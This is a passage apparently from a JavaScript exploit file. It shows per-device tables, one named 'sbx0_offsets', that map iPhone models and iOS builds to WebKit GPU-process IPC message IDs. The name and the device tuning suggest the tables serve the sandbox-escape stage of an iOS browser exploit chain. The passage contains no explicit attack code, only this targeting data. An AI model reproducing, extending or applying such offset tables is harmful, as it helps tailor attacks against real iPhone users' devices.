      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,5_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   }
};

  sbx0_offsets = {
   "iPhone11,2_4_6_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone11,8_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone12,1_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone12,3_5_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone12,8_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone13,1_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone13,2_3_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone13,4_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,2_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,3_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,4_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,5_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
